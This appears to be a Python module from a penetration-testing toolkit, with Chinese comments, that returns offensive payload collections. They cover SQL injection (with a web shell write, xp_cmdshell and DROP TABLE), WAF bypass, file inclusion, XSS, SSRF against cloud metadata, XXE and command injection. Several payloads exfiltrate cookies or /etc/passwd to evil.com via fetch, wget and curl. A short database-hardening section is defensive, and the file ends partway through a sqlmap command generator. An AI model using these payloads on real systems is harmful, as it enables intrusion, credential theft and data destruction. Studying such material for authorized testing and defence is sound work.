"""Web安全模块 - SQL注入、XSS、SSRF、XXE、文件包含、命令注入"""


def sqli_complete_guide(injection_type: str = "all") -> dict:
    """SQL注入完整指南 - 覆盖13+注入类型"""

    guides = {
        "union": {
            "name": "联合查询注入",
            "适用": "有回显的注入点",
            "步骤": [
                "1. 判断注入点: ' OR '1'='1 / ' AND '1'='1",
                "2. ORDER BY判断列数: ' ORDER BY 1-- 递增直到报错",
                "3. 找显示位: ' UNION SELECT 1,2,3-- (列数对齐)",
                "4. 获取数据库信息: ' UNION SELECT 1,database(),version()--",
                "5. 获取表名: ' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--",
                "6. 获取列名: ' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--",
                "7. 获取数据: ' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--",
            ],
            "payloads": [
                {"payload": "' UNION SELECT NULL--", "desc": "判断列数(逐步增加NULL)"},
                {"payload": "' UNION SELECT 1,2,3--", "desc": "找显示位"},
                {"payload": "' UNION SELECT 1,database(),version()--", "desc": "获取库名版本"},
                {"payload": "' UNION SELECT 1,user(),3--", "desc": "获取当前用户"},
                {"payload": "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--", "desc": "获取所有表名"},
                {"payload": "' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--", "desc": "获取列名"},
                {"payload": "' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--", "desc": "获取数据"},
                {"payload": "' UNION SELECT 1,load_file('/etc/passwd'),3--", "desc": "读取文件"},
                {"payload": "' UNION SELECT 1,'<?php eval($_POST[cmd]);?>',3 INTO OUTFILE '/tmp/shell.php'--", "desc": "写入WebShell"},
            ]
        },
        "error": {
            "name": "报错注入",
            "适用": "有SQL报错信息回显",
            "payloads": [
                {"payload": "' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--", "desc": "extractvalue获取库名"},
                {"payload": "' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))--", "desc": "extractvalue获取表名"},
                {"payload": "' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--", "desc": "updatexml获取库名"},
                {"payload": "' AND updatexml(1,concat(0x7e,(SELECT group_concat(username,0x3a,password) FROM users),0x7e),1)--", "desc": "updatexml获取数据"},
                {"payload": "' AND (SELECT 1 FROM (SELECT count(*),concat((SELECT database()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "desc": "floor报错获取库名"},
                {"payload": "' AND (SELECT 1 FROM (SELECT count(*),concat((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "desc": "floor报错获取表名"},
                {"payload": "' AND geometrycollection((select * from(select * from(select database())a)b))--", "desc": "geometrycollection报错"},
                {"payload": "' AND polygon((select * from(select database())a))--", "desc": "polygon报错"},
                {"payload": "' AND multipoint((select * from(select database())a))--", "desc": "multipoint报错"},
            ]
        },
        "blind_bool": {
            "name": "布尔盲注",
            "适用": "无回显，只有真/假两种状态",
            "说明": "通过逐字符ASCII比较提取数据",
            "payloads": [
                {"payload": "' AND ascii(substr(database(),1,1))>100--", "desc": "二分法猜库名首字符"},
                {"payload": "' AND ascii(substr(database(),1,1))=115--", "desc": "精确匹配(ASCII 115='s')"},
                {"payload": "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5--", "desc": "猜表数量"},
                {"payload": "' AND ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))>100--", "desc": "猜第一个表名首字符"},
                {"payload": "' AND length(database())=8--", "desc": "猜库名长度"},
                {"payload": "' AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))=5--", "desc": "猜表名长度"},
            ],
            "python脚本模板": """
import requests
result = ""
for i in range(1, 50):
    for j in range(32, 127):
        url = f"http://target/?id=' AND ascii(substr(database(),{i},1))={j}--"
        r = requests.get(url)
        if "正确回显标记" in r.text:
            result += chr(j)
            break
print(result)
"""
        },
        "blind_time": {
            "name": "时间盲注",
            "适用": "无任何回显差异",
            "payloads": [
                {"payload": "' AND IF(ascii(substr(database(),1,1))=115,SLEEP(5),0)--", "desc": "IF+SLEEP时间盲注"},
                {"payload": "' AND IF(SUBSTR(database(),1,1)='s',SLEEP(5),0)--", "desc": "直接字符比较"},
                {"payload": "' AND (SELECT IF(ascii(substr(database(),1,1))>100,SLEEP(5),0))--", "desc": "SELECT嵌套"},
                {"payload": "' AND (SELECT 1 FROM (SELECT IF(ascii(substr(database(),1,1))=115,BENCHMARK(10000000,sha1('test')),0))x)--", "desc": "BENCHMARK延时"},
                {"payload": "1'; SELECT IF(ascii(substr(database(),1,1))=115,SLEEP(5),0);--", "desc": "堆叠查询+时间盲注"},
            ]
        },
        "stacked": {
            "name": "堆叠查询注入",
            "适用": "支持多语句执行(如mysqli_multi_query)",
            "说明": "用分号分隔多条SQL语句",
            "payloads": [
                {"payload": "'; DROP TABLE users;--", "desc": "删除表(危险!)"},
                {"payload": "'; INSERT INTO users(username,password) VALUES('admin','hacked');--", "desc": "插入数据"},
                {"payload": "'; UPDATE users SET password='hacked' WHERE username='admin';--", "desc": "修改数据"},
                {"payload": "'; CREATE USER 'hacker'@'%' IDENTIFIED BY 'pass'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%';--", "desc": "创建管理员"},
                {"payload": "'; SET @sql=concat('sel','ect 1'); PREPARE stmt FROM @sql; EXECUTE stmt;--", "desc": "预编译绕过关键字过滤"},
            ]
        },
        "wide_byte": {
            "name": "宽字节注入",
            "适用": "GBK编码，PHP使用addslashes/mysql_real_escape_string",
            "原理": "编码%df与转义符\\(%5c)合并为一个GBK字符，吃掉转义符",
            "payloads": [
                {"payload": "%df' UNION SELECT 1,2,3--", "desc": "宽字节联合查询"},
                {"payload": "%df' OR 1=1--", "desc": "宽字节万能密码"},
                {"payload": "%df%27 UNION SELECT 1,database(),3--", "desc": "URL编码+宽字节"},
                {"payload": "kobe%df' UNION SELECT 1,2,3,4-- -", "desc": "带前缀的宽字节注入"},
            ]
        },
        "header": {
            "name": "HTTP头注入",
            "适用": "服务端将HTTP头写入数据库(如UA、Referer、Cookie)",
            "payloads": [
                {"payload": "User-Agent: Mozilla' AND extractvalue(1,concat(0x7e,database(),0x7e)) and '1'='1", "desc": "User-Agent报错注入"},
                {"payload": "Referer: http://evil.com' AND 1=1--", "desc": "Referer注入"},
                {"payload": "Cookie: uname=admin' AND 1=1--", "desc": "Cookie注入"},
                {"payload": "X-Forwarded-For: 127.0.0.1' AND 1=1--", "desc": "XFF注入"},
                {"payload": "Cookie: uname=YWRtaW4gYW5kIDE9MQ==", "desc": "Base64编码Cookie注入(admin and 1=1)"},
            ]
        },
        "login_bypass": {
            "name": "登录绕过注入",
            "适用": "登录表单",
            "payloads": [
                {"payload": "admin' --", "desc": "注释掉密码验证"},
                {"payload": "admin' #", "desc": "MySQL注释绕过"},
                {"payload": "' OR '1'='1", "desc": "万能密码"},
                {"payload": "' OR '1'='1' --", "desc": "万能密码+注释"},
                {"payload": "' OR '1'='1' #", "desc": "万能密码+MySQL注释"},
                {"payload": "admin' OR '1'='1", "desc": "指定用户万能密码"},
                {"payload": "' OR 1=1 LIMIT 1--", "desc": "限制返回一行"},
                {"payload": "= ' OR '1'='1", "desc": "某些CMS绕过"},
                {"payload": "' OR ''='", "desc": "空字符串绕过"},
                {"payload": "' OR 1=1-- -", "desc": "带空格注释"},
            ]
        },
        "order_by": {
            "name": "ORDER BY注入",
            "适用": "ORDER BY子句可控",
            "payloads": [
                {"payload": "ORDER BY 1 ASC", "desc": "正常排序(测试列数)"},
                {"payload": "ORDER BY 100 ASC", "desc": "超出列数报错"},
                {"payload": "ORDER BY (CASE WHEN (1=1) THEN 1 ELSE 2 END)", "desc": "条件排序(布尔盲注)"},
                {"payload": "ORDER BY (SELECT 1 FROM (SELECT IF(ascii(substr(database(),1,1))>100,SLEEP(3),0))x)", "desc": "ORDER BY时间盲注"},
                {"payload": "ORDER BY 1; DROP TABLE users--", "desc": "堆叠查询(需支持)"},
            ]
        },
        "insert_update": {
            "name": "INSERT/UPDATE注入",
            "适用": "INSERT或UPDATE语句中的可控参数",
            "payloads": [
                {"payload": "INSERT INTO users VALUES(1,'admin'',''hacked')-- ", "desc": "INSERT闭合绕过"},
                {"payload": "INSERT INTO users(name) VALUES((SELECT password FROM users WHERE id=1))", "desc": "INSERT子查询"},
                {"payload": "UPDATE users SET name='admin' WHERE id=1 AND 1=1--", "desc": "UPDATE条件注入"},
                {"payload": "UPDATE users SET name=(SELECT group_concat(username,0x3a,password) FROM users) WHERE id=1", "desc": "UPDATE子查询提取数据"},
            ]
        },
        "filter_bypass": {
            "name": "过滤绕过技巧",
            "payloads": [
                {"payload": "UnIoN SeLeCt", "desc": "大小写绕过"},
                {"payload": "uniunionon selselectect", "desc": "双写绕过"},
                {"payload": "/**/UNION/**/SELECT/**/1,2,3--", "desc": "注释符代替空格"},
                {"payload": "%09UNION%09SELECT%091,2,3--", "desc": "TAB(%09)代替空格"},
                {"payload": "%0aUNION%0aSELECT%0a1,2,3--", "desc": "换行(%0a)代替空格"},
                {"payload": "%0bUNION%0bSELECT%0b1,2,3--", "desc": "垂直TAB(%0b)"},
                {"payload": "%0cUNION%0cSELECT%0c1,2,3--", "desc": "换页(%0c)"},
                {"payload": "%0dUNION%0dSELECT%0d1,2,3--", "desc": "回车(%0d)"},
                {"payload": "UNION%0aSELECT%0a1,2,3--", "desc": "混合编码绕过"},
                {"payload": "1 && 1=1--", "desc": "&&代替AND"},
                {"payload": "1 || 1=1--", "desc": "||代替OR"},
                {"payload": "1 LIKE 1--", "desc": "LIKE代替="},
                {"payload": "1 REGEXP '^[0-9]'--", "desc": "REGEXP绕过"},
                {"payload": "1 BETWEEN 0 AND 2--", "desc": "BETWEEN绕过"},
                {"payload": "'=0--+ ", "desc": "=0绕过"},
                {"payload": "1,(select 1)=1--", "desc": "子查询绕过"},
            ]
        },
        "sqlmap": {
            "name": "sqlmap自动化",
            "commands": [
                {"cmd": "sqlmap -u 'http://target/?id=1'", "desc": "基础检测"},
                {"cmd": "sqlmap -u 'http://target/?id=1' --batch --dbs", "desc": "自动获取数据库"},
                {"cmd": "sqlmap -u 'http://target/?id=1' -D database --tables --batch", "desc": "获取表名"},
                {"cmd": "sqlmap -u 'http://target/?id=1' -D database -T users --dump --batch", "desc": "导出数据"},
                {"cmd": "sqlmap -u 'http://target/?id=1' --current-db --batch", "desc": "当前数据库"},
                {"cmd": "sqlmap -u 'http://target/?id=1' --technique=U --batch", "desc": "只用联合查询"},
                {"cmd": "sqlmap -u 'http://target/?id=1' --level=3 --risk=2 --batch", "desc": "高风险高级别检测"},
                {"cmd": "sqlmap -u 'http://target/?id=1' --tamper=space2comment --batch", "desc": "绕过WAF"},
                {"cmd": "sqlmap -u 'http://target/?id=1' --os-shell --batch", "desc": "获取系统Shell"},
                {"cmd": "sqlmap -u 'http://target/?id=1' --file-read=/etc/passwd --batch", "desc": "读取文件"},
                {"cmd": "sqlmap -r request.txt --batch --dbs", "desc": "从请求文件检测"},
                {"cmd": "sqlmap -u 'http://target/' --cookie='id=1*' --batch", "desc": "Cookie注入(*)"},
                {"cmd": "sqlmap -u 'http://target/' --data='user=1*&pass=1*' --batch", "desc": "POST注入"},
                {"cmd": "sqlmap -u 'http://target/?id=1' --random-agent --batch", "desc": "随机UA"},
                {"cmd": "sqlmap -u 'http://target/?id=1' --proxy=http://127.0.0.1:8080 --batch", "desc": "走代理(Burp)"},
            ],
            "tamper脚本": [
                "space2comment - 空格替换为/**/",
                "between - 替换为BETWEEN",
                "charencode - URL编码",
                "randomcase - 随机大小写",
                "equaltolike - =替换为LIKE",
                "greatest - 替换为GREATEST",
                "apostrophemask - 单引号替换为UTF-8",
                "base64encode - Base64编码",
                "space2plus - 空格替换为+",
                "space2mssqlblank - 空格替换为MSSQL空白符",
            ]
        }
    }

    if injection_type == "all":
        return {"success": True, "types": list(guides.keys()), "guides": guides}
    if injection_type in guides:
        return {"success": True, "type": injection_type, "guide": guides[injection_type]}
    return {"success": False, "error": f"未知注入类型: {injection_type}", "available": list(guides.keys())}


def sqli_filter_bypass() -> dict:
    """SQL注入WAF绕过技巧大全"""
    return {
        "success": True,
        "空格绕过": [
            "/**/", "%09", "%0a", "%0b", "%0c", "%0d", "%a0", "()", "+"
        ],
        "关键字绕过": {
            "UNION": ["uniunionon", "UNION/**/", "UnIoN", "%55NION"],
            "SELECT": ["selselectect", "SELECT/**/", "SeLeCt", "%53ELECT"],
            "AND": ["aandnd", "&&", "%26%26"],
            "OR": ["oorr", "||", "%7C%7C"],
            "FROM": ["frfromom", "FROM/**/"],
            "WHERE": ["whwhereere", "WHERE/**/"],
            "ORDER": ["orderby", "ORDER/**/"],
        },
        "引号绕过": [
            "0x十六进制(如0x7573657273代替'users')",
            "char()函数(如char(117,115,101,114,115))",
            "宽字节%df'",
            "\\转义绕过",
        ],
        "注释符绕过": ["--+", "#", "%23", "-- -", ";%00", "'"],
        "等号绕过": ["LIKE", "REGEXP", "BETWEEN", "IN", "GREATEST", "strcmp"],
        "逗号绕过": [
            "UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b",
            "LIMIT 0 OFFSET 1 代替 LIMIT 0,1",
            "CASE WHEN THEN ELSE END 代替 CASE,1,2",
        ],
        "HTTP参数污染": "?id=1&id=-1' union select 1,2,3--",
        "编码绕过": ["URL编码", "双重URL编码", "Unicode编码", "Base64编码", "HTML实体编码"],
    }


def sqli_payloads(db_type: str = 'auto') -> dict:
    """生成SQL注入常用payload"""

    basic_payloads = [
        {"payload": "' OR '1'='1", "desc": "万能密码绕过", "risk": "低"},
        {"payload": "' OR '1'='1' --", "desc": "万能密码(注释)", "risk": "低"},
        {"payload": "' OR '1'='1' #", "desc": "万能密码(MySQL注释)", "risk": "低"},
        {"payload": "admin' --", "desc": "注释掉密码验证", "risk": "低"},
        {"payload": "' UNION SELECT NULL--", "desc": "判断列数", "risk": "中"},
        {"payload": "' UNION SELECT 1,2,3--", "desc": "联合查询探测", "risk": "中"},
        {"payload": "' AND 1=1--", "desc": "布尔盲注-真", "risk": "低"},
        {"payload": "' AND 1=2--", "desc": "布尔盲注-假", "risk": "低"},
        {"payload": "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--", "desc": "探测信息表", "risk": "高"},
        {"payload": "1' ORDER BY 1--", "desc": "ORDER BY排序注入", "risk": "低"},
        {"payload": "1' ORDER BY 100--", "desc": "ORDER BY报错判断列数", "risk": "低"},
    ]

    mysql_payloads = [
        {"payload": "' UNION SELECT 1,user(),3--", "desc": "获取MySQL用户名", "risk": "高"},
        {"payload": "' UNION SELECT 1,database(),3--", "desc": "获取当前数据库名", "risk": "高"},
        {"payload": "' UNION SELECT 1,version(),3--", "desc": "获取MySQL版本", "risk": "中"},
        {"payload": "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--", "desc": "获取所有表名", "risk": "高"},
        {"payload": "' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--", "desc": "获取users表列名", "risk": "高"},
        {"payload": "' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--", "desc": "获取用户名密码", "risk": "极高"},
        {"payload": "' AND SLEEP(5)--", "desc": "时间盲注测试", "risk": "中"},
        {"payload": "' AND (SELECT 1 FROM (SELECT SLEEP(5))x)--", "desc": "延时注入", "risk": "中"},
        {"payload": "' UNION SELECT 1,load_file('/etc/passwd'),3--", "desc": "读取文件(MySQL)", "risk": "极高"},
    ]

    mssql_payloads = [
        {"payload": "'; EXEC xp_cmdshell('whoami')--", "desc": "执行系统命令(MSSQL)", "risk": "极高"},
        {"payload": "' UNION SELECT 1,@@version,3--", "desc": "MSSQL版本", "risk": "中"},
        {"payload": "' UNION SELECT 1,DB_NAME(),3--", "desc": "当前数据库名", "risk": "高"},
        {"payload": "' UNION SELECT 1,name,3 FROM master..sysdatabases--", "desc": "所有数据库", "risk": "高"},
    ]

    postgres_payloads = [
        {"payload": "' UNION SELECT 1,version(),3--", "desc": "PostgreSQL版本", "risk": "中"},
        {"payload": "' UNION SELECT 1,current_database(),3--", "desc": "当前数据库", "risk": "高"},
        {"payload": "' UNION SELECT 1,string_agg(tablename,','),3 FROM pg_tables WHERE schemaname='public'--", "desc": "所有表名", "risk": "高"},
        {"payload": "'; SELECT pg_sleep(5)--", "desc": "时间盲注", "risk": "中"},
    ]

    sqlite_payloads = [
        {"payload": "' UNION SELECT 1,sqlite_version(),3--", "desc": "SQLite版本", "risk": "中"},
        {"payload": "' UNION SELECT 1,group_concat(tbl_name),3 FROM sqlite_master WHERE type='table'--", "desc": "所有表名", "risk": "高"},
        {"payload": "' UNION SELECT 1,group_concat(sql),3 FROM sqlite_master--", "desc": "获取建表语句", "risk": "高"},
    ]

    error_payloads = [
        {"payload": "' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))--", "desc": "XPath报错注入(MySQL)", "risk": "高"},
        {"payload": "' AND (SELECT 1 FROM (SELECT count(*),concat((SELECT database()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "desc": "floor报错注入", "risk": "高"},
        {"payload": "' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--", "desc": "updatexml报错注入", "risk": "高"},
    ]

    result = {"basic": basic_payloads}

    if db_type in ('auto', 'mysql'):
        result["mysql"] = mysql_payloads
    if db_type in ('auto', 'mssql'):
        result["mssql"] = mssql_payloads
    if db_type in ('auto', 'postgresql', 'postgres'):
        result["postgresql"] = postgres_payloads
    if db_type in ('auto', 'sqlite'):
        result["sqlite"] = sqlite_payloads
    if db_type in ('auto', 'error'):
        result["error_based"] = error_payloads

    result["tips"] = [
        "先用 ' OR '1'='1 测试是否存在注入",
        "用 ORDER BY 判断列数",
        "用 UNION SELECT 探测显示位",
        "布尔盲注适合无回显场景",
        "时间盲注适合无报错场景",
        "sqlmap 是自动化注入神器",
    ]

    return result


def file_inclusion_payloads() -> dict:
    """生成文件包含漏洞payload"""

    lfi_payloads = [
        {"payload": "../../../etc/passwd", "desc": "Linux读取passwd", "risk": "高"},
        {"payload": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "desc": "Windows读取hosts", "risk": "高"},
        {"payload": "....//....//....//etc/passwd", "desc": "双写绕过", "risk": "中"},
        {"payload": "..%2F..%2F..%2Fetc%2Fpasswd", "desc": "URL编码绕过", "risk": "中"},
        {"payload": "php://filter/convert.base64-encode/resource=index.php", "desc": "PHP伪协议读源码", "risk": "高"},
        {"payload": "php://input", "desc": "PHP输入流执行代码", "risk": "极高"},
        {"payload": "data://text/plain,<?php system('whoami');?>", "desc": "data协议执行命令", "risk": "极高"},
        {"payload": "file:///etc/passwd", "desc": "file协议读文件", "risk": "高"},
        {"payload": "/proc/self/environ", "desc": "读取环境变量", "risk": "中"},
        {"payload": "php://filter/read=convert.base64-encode/resource=config.php", "desc": "读取配置文件", "risk": "高"},
    ]

    rfi_payloads = [
        {"payload": "http://evil.com/shell.txt", "desc": "远程文件包含(需allow_url_include=On)", "risk": "极高"},
        {"payload": "http://evil.com/shell.txt%00", "desc": "空字节截断(老版本PHP)", "risk": "极高"},
    ]

    bypass_tips = [
        "目录穿越: ../ ..\\ ....// ..././",
        "编码绕过: URL编码、双重URL编码、Unicode编码",
        "PHP伪协议: php://filter、php://input、data://",
        "截断绕过: %00 (PHP < 5.3.4)",
        "日志注入: User-Agent写入一句话到日志，然后包含日志文件",
        "Session文件包含: /tmp/sess_PHPSESSID",
    ]

    return {
        "lfi": lfi_payloads,
        "rfi": rfi_payloads,
        "bypass_tips": bypass_tips,
        "common_files": [
            "/etc/passwd", "/etc/shadow", "/etc/hosts",
            "/proc/self/environ", "/proc/self/cmdline",
            "/var/log/apache2/access.log", "/var/log/nginx/access.log",
            "C:\\windows\\system32\\drivers\\etc\\hosts", "C:\\windows\\win.ini",
        ]
    }


def xss_payloads() -> dict:
    """生成XSS payload"""

    basic = [
        {"payload": "<script>alert('XSS')</script>", "desc": "基础XSS", "risk": "低"},
        {"payload": "<img src=x onerror=alert('XSS')>", "desc": "图片标签onerror", "risk": "低"},
        {"payload": "<svg onload=alert('XSS')>", "desc": "SVG标签onload", "risk": "低"},
        {"payload": "javascript:alert('XSS')", "desc": "javascript伪协议", "risk": "低"},
        {"payload": "'-alert('XSS')-'", "desc": "字符串逃逸", "risk": "低"},
        {"payload": "\";alert('XSS');//", "desc": "双引号逃逸", "risk": "低"},
    ]

    bypass = [
        {"payload": "<scr<script>ipt>alert('XSS')</scr</script>ipt>", "desc": "双写绕过", "risk": "中"},
        {"payload": "<ScRiPt>alert('XSS')</ScRiPt>", "desc": "大小写绕过", "risk": "中"},
        {"payload": "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;('XSS')>", "desc": "HTML实体编码绕过", "risk": "中"},
        {"payload": "<details open ontoggle=alert('XSS')>", "desc": "details标签绕过", "risk": "中"},
        {"payload": "<body onload=alert('XSS')>", "desc": "body标签onload", "risk": "中"},
        {"payload": "<iframe src='javascript:alert(`XSS`)'>", "desc": "iframe注入", "risk": "中"},
        {"payload": "{{constructor.constructor('alert(1)')()}}", "desc": "模板注入SSTI", "risk": "高"},
        {"payload": "${alert('XSS')}", "desc": "模板表达式注入", "risk": "高"},
    ]

    steal = [
        {"payload": "<script>new Image().src='http://evil.com/?c='+document.cookie</script>", "desc": "Cookie窃取", "risk": "极高"},
        {"payload": "<script>fetch('http://evil.com/?c='+document.cookie)</script>", "desc": "Fetch窃取Cookie", "risk": "极高"},
        {"payload": "<script>document.location='http://evil.com/?c='+document.cookie</script>", "desc": "跳转窃取Cookie", "risk": "极高"},
    ]

    return {"basic": basic, "bypass": bypass, "steal": steal}


def ssrf_payloads() -> dict:
    """生成SSRF payload"""

    basic = [
        {"payload": "http://127.0.0.1", "desc": "本地回环", "risk": "中"},
        {"payload": "http://localhost", "desc": "localhost", "risk": "中"},
        {"payload": "http://0.0.0.0", "desc": "全零地址", "risk": "中"},
        {"payload": "http://[::1]", "desc": "IPv6回环", "risk": "中"},
    ]

    bypass = [
        {"payload": "http://0x7f.0x00.0x00.0x01", "desc": "十六进制IP", "risk": "高"},
        {"payload": "http://2130706433", "desc": "十进制IP", "risk": "高"},
        {"payload": "http://0177.0.0.1", "desc": "八进制IP", "risk": "高"},
        {"payload": "http://127.0.0.1.nip.io", "desc": "DNS重绑定", "risk": "高"},
        {"payload": "http://evil.com@127.0.0.1", "desc": "@绕过", "risk": "高"},
        {"payload": "http://127.0.0.1:80@evil.com", "desc": "端口@绕过", "risk": "高"},
    ]

    internal = [
        {"payload": "http://169.254.169.254/latest/meta-data/", "desc": "AWS元数据", "risk": "极高"},
        {"payload": "http://metadata.google.internal/", "desc": "GCP元数据", "risk": "极高"},
        {"payload": "http://169.254.169.254/metadata/instance", "desc": "Azure元数据", "risk": "极高"},
        {"payload": "http://127.0.0.1:6379/", "desc": "Redis未授权", "risk": "极高"},
        {"payload": "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a", "desc": "Gopher攻击Redis", "risk": "极高"},
    ]

    protocol = [
        {"payload": "file:///etc/passwd", "desc": "file协议读文件", "risk": "高"},
        {"payload": "dict://127.0.0.1:6379/info", "desc": "dict协议探测", "risk": "高"},
        {"payload": "gopher://127.0.0.1:80/_GET / HTTP/1.1", "desc": "gopher协议", "risk": "高"},
    ]

    return {"basic": basic, "bypass": bypass, "internal": internal, "protocol": protocol}


def xxe_payloads() -> dict:
    """生成XXE payload"""

    basic = [
        {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', "desc": "读取文件(Linux)", "risk": "高"},
        {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><foo>&xxe;</foo>', "desc": "读取文件(Windows)", "risk": "高"},
        {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/">]><foo>&xxe;</foo>', "desc": "SSRF探测", "risk": "高"},
    ]

    advanced = [
        {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">%dtd;]><foo>&send;</foo>', "desc": "外带数据(OOB)", "risk": "极高"},
        {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>', "desc": "PHP伪协议读源码", "risk": "极高"},
        {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>', "desc": "expect协议执行命令", "risk": "极高"},
    ]

    bypass = [
        {"payload": "使用UTF-16编码绕过WAF", "desc": "编码绕过"},
        {"payload": "使用参数实体代替通用实体", "desc": "参数实体绕过"},
        {"payload": "使用CDATA包裹特殊字符", "desc": "CDATA绕过"},
    ]

    return {"basic": basic, "advanced": advanced, "bypass": bypass}


def cmd_injection_payloads() -> dict:
    """生成命令注入payload"""

    basic = [
        {"payload": ";id", "desc": "分号分隔", "risk": "高"},
        {"payload": "|id", "desc": "管道符", "risk": "高"},
        {"payload": "||id", "desc": "或逻辑", "risk": "高"},
        {"payload": "&&id", "desc": "与逻辑", "risk": "高"},
        {"payload": "`id`", "desc": "反引号", "risk": "高"},
        {"payload": "$(id)", "desc": "命令替换", "risk": "高"},
    ]

    bypass = [
        {"payload": "i$@d", "desc": "变量拼接绕过", "risk": "中"},
        {"payload": "i''d", "desc": "单引号绕过", "risk": "中"},
        {"payload": "i\"\"d", "desc": "双引号绕过", "risk": "中"},
        {"payload": "c'a't /etc/passwd", "desc": "单引号分割", "risk": "中"},
        {"payload": "cat /etc/pas??d", "desc": "通配符绕过", "risk": "中"},
        {"payload": "cat /etc/pas*wd", "desc": "星号绕过", "risk": "中"},
        {"payload": "${IFS}id", "desc": "IFS分隔", "risk": "中"},
        {"payload": "cat$IFS/etc/passwd", "desc": "IFS代替空格", "risk": "中"},
    ]

    data_exfil = [
        {"payload": "cat /etc/passwd | base64", "desc": "Base64编码外带", "risk": "高"},
        {"payload": "cat /etc/passwd > /tmp/out.txt", "desc": "写入文件", "risk": "高"},
        {"payload": "wget http://evil.com/$(cat /etc/passwd | base64)", "desc": "HTTP外带", "risk": "极高"},
        {"payload": "curl http://evil.com -d @/etc/passwd", "desc": "Curl外带", "risk": "极高"},
    ]

    return {"basic": basic, "bypass": bypass, "data_exfil": data_exfil}


def db_security_hardening(db_type: str = "mysql") -> dict:
    """数据库安全加固指南"""
    guides = {
        "mysql": {
            "name": "MySQL安全加固",
            "checks": [
                {"name": "删除匿名用户", "cmd": "DELETE FROM mysql.user WHERE User=''; FLUSH PRIVILEGES;"},
                {"name": "修改root密码", "cmd": "ALTER USER 'root'@'localhost' IDENTIFIED BY 'StrongPassword123!';"},
                {"name": "禁止root远程登录", "cmd": "DELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost','127.0.0.1','::1'); FLUSH PRIVILEGES;"},
                {"name": "创建低权限用户", "cmd": "CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'WebApp@2025!'; GRANT SELECT,INSERT ON mydb.* TO 'webapp'@'localhost';"},
                {"name": "删除测试数据库", "cmd": "DROP DATABASE IF EXISTS test; DELETE FROM mysql.db WHERE Db='test'; FLUSH PRIVILEGES;"},
                {"name": "开启日志审计", "cmd": "SET GLOBAL general_log = 'ON'; SET GLOBAL log_output = 'TABLE';"},
                {"name": "强制SSL连接", "cmd": "ALTER USER 'webapp'@'localhost' REQUIRE SSL;"},
                {"name": "限制文件权限", "cmd": "SET GLOBAL local_infile = 0;"},
            ],
            "配置文件加固": [
                "bind-address = 127.0.0.1  # 只监听本地",
                "skip-networking  # 禁止网络连接(如只需本地)",
                "local_infile = 0  # 禁止LOAD DATA LOCAL",
                "safe-user-create = 1  # 限制用户创建权限",
                "symbolic-links = 0  # 禁止符号链接",
            ],
            "角色分离": [
                "report_user: SELECT only",
                "app_user: SELECT, INSERT, UPDATE",
                "ops_user: DDL + DML (no GRANT)",
                "dba_user: ALL PRIVILEGES",
            ]
        },
        "redis": {
            "name": "Redis安全加固",
            "checks": [
                {"name": "绑定本地地址", "cmd": "bind 127.0.0.1"},
                {"name": "设置密码", "cmd": "requirepass YourStrongPassword"},
                {"name": "禁用危险命令", "cmd": "rename-command CONFIG ''\nrename-command FLUSHALL ''\nrename-command FLUSHDB ''\nrename-command DEBUG ''"},
                {"name": "禁用Lua脚本", "cmd": "rename-command EVAL ''"},
                {"name": "以非root运行", "cmd": "useradd -r -s /bin/false redis && chown -R redis:redis /var/lib/redis"},
            ]
        }
    }
    if db_type in guides:
        return {"success": True, "guide": guides[db_type]}
    return {"success": True, "available": list(guides.keys()), "guides": guides}


def generate_sqlmap_cmd(url: str, data: str = None, cookie: str = None, method: str = 'GET') -> dict:
    """生成sqlmap命令"""

    if not url:
        return {"error": "请提供目标URL"}

    cmd_parts = ["sqlmap", f"-u \"{url}\""]

    if method.upper() == 'POST' and data:
        cmd_parts.append(f"--data=\"{data}\"")

    if cookie:
        cmd_parts.append(f"--cookie=\"{cookie}\"")

    basic_cmd = " ".join(cmd_parts)

    return {
        "commands": [
            {"name": "基础检测", "cmd": basic_cmd, "desc": "检测是否存在注入点"},
